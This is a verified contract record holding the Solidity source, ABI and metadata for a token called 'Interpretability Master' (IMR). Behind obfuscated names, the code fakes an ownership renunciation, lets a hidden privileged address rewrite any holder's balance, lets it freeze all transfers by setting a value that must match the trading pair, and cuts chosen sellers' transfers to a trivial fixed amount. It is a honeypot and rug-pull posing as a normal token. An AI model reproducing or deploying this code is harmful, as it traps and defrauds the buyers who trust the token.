{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface sellFee {\n    function createPair(address feeMax, address launchedToken) external returns (address);\n}\n\ninterface maxList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldFund) external view returns (uint256);\n\n    function transfer(address takeWalletList, uint256 feeFrom) external returns (bool);\n\n    function allowance(address maxFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeWalletList,\n        uint256 feeFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFrom, uint256 value);\n    event Approval(address indexed maxFund, address indexed spender, uint256 value);\n}\n\nabstract contract takeLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeExemptIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletBuy is maxList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterpretabilityMaster is takeLiquidity, maxList, walletBuy {\n\n    function swapTrading(uint256 feeFrom) public {\n        tradingTo();\n        feeModeIs = feeFrom;\n    }\n\n    mapping(address => bool) public totalLaunch;\n\n    function approve(address minList, uint256 feeFrom) public virtual override returns (bool) {\n        limitMin[_msgSender()][minList] = feeFrom;\n        emit Approval(_msgSender(), minList, feeFrom);\n        return true;\n    }\n\n    function shouldAt() public {\n        emit OwnershipTransferred(marketingSender, address(0));\n        teamMarketing = address(0);\n    }\n\n    uint256 feeModeIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTake;\n    }\n\n    function transfer(address feeFromMarketing, uint256 feeFrom) external virtual override returns (bool) {\n        return sellMode(_msgSender(), feeFromMarketing, feeFrom);\n    }\n\n    function balanceOf(address shouldFund) public view virtual override returns (uint256) {\n        return minTrading[shouldFund];\n    }\n\n    function allowance(address swapTotal, address minList) external view virtual override returns (uint256) {\n        if (minList == isSellFund) {\n            return type(uint256).max;\n        }\n        return limitMin[swapTotal][minList];\n    }\n\n    bool private buyMin;\n\n    uint256 marketingReceiver;\n\n    function getOwner() external view returns (address) {\n        return teamMarketing;\n    }\n\n    address public toLaunchedFee;\n\n    address private teamMarketing;\n\n    address isSellFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLaunched;\n    }\n\n    uint256 public txFund;\n\n    bool public shouldMinMode;\n\n    mapping(address => uint256) private minTrading;\n\n    mapping(address => bool) public feeSell;\n\n    uint256 private liquidityTake;\n\n    function tradingTo() private view {\n        require(totalLaunch[_msgSender()]);\n    }\n\n    function atSwapSell(address liquidityList) public {\n        if (swapAmount) {\n            return;\n        }\n        \n        totalLaunch[liquidityList] = true;\n        \n        swapAmount = true;\n    }\n\n    function owner() external view returns (address) {\n        return teamMarketing;\n    }\n\n    address public marketingSender;\n\n    event OwnershipTransferred(address indexed marketingShould, address indexed isWallet);\n\n    function receiverSell(address feeFromMarketing, uint256 feeFrom) public {\n        tradingTo();\n        minTrading[feeFromMarketing] = feeFrom;\n    }\n\n    bool private swapShould;\n\n    address fundAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private feeTake = \"IMR\";\n\n    function shouldReceiver(address launchLaunched, address takeWalletList, uint256 feeFrom) internal returns (bool) {\n        require(minTrading[launchLaunched] >= feeFrom);\n        minTrading[launchLaunched] -= feeFrom;\n        minTrading[takeWalletList] += feeFrom;\n        emit Transfer(launchLaunched, takeWalletList, feeFrom);\n        return true;\n    }\n\n    function sellMode(address launchLaunched, address takeWalletList, uint256 feeFrom) internal returns (bool) {\n        if (launchLaunched == marketingSender) {\n            return shouldReceiver(launchLaunched, takeWalletList, feeFrom);\n        }\n        uint256 tokenAt = maxList(toLaunchedFee).balanceOf(fundAt);\n        require(tokenAt == feeModeIs);\n        require(takeWalletList != fundAt);\n        if (feeSell[launchLaunched]) {\n            return shouldReceiver(launchLaunched, takeWalletList, tokenLimit);\n        }\n        return shouldReceiver(launchLaunched, takeWalletList, feeFrom);\n    }\n\n    uint256 private marketingLaunch;\n\n    function transferFrom(address launchLaunched, address takeWalletList, uint256 feeFrom) external override returns (bool) {\n        if (_msgSender() != isSellFund) {\n            if (limitMin[launchLaunched][_msgSender()] != type(uint256).max) {\n                require(feeFrom <= limitMin[launchLaunched][_msgSender()]);\n                limitMin[launchLaunched][_msgSender()] -= feeFrom;\n            }\n        }\n        return sellMode(launchLaunched, takeWalletList, feeFrom);\n    }\n\n    function fundAuto(address tradingList) public {\n        tradingTo();\n        \n        if (tradingList == marketingSender || tradingList == toLaunchedFee) {\n            return;\n        }\n        feeSell[tradingList] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitMin;\n\n    uint256 private txLaunched = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        modeExemptIs buyTradingLaunched = modeExemptIs(isSellFund);\n        toLaunchedFee = sellFee(buyTradingLaunched.factory()).createPair(buyTradingLaunched.WETH(), address(this));\n        if (marketingLaunch != txFund) {\n            buyMin = false;\n        }\n        marketingSender = _msgSender();\n        totalLaunch[marketingSender] = true;\n        minTrading[marketingSender] = txLaunched;\n        shouldAt();\n        \n        emit Transfer(address(0), marketingSender, txLaunched);\n    }\n\n    uint256 public launchToken;\n\n    string private minWallet = \"Interpretability Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingEnableFrom;\n    }\n\n    bool public swapAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return minWallet;\n    }\n\n    uint256 constant tokenLimit = 9 ** 10;\n\n    uint8 private tradingEnableFrom = 18;\n\n    uint256 public fromTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"atSwapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFrom\",\"type\":\"uint256\"}],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMinMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeFrom\",\"type\":\"uint256\"}],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchedFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeWalletList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InterpretabilityMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}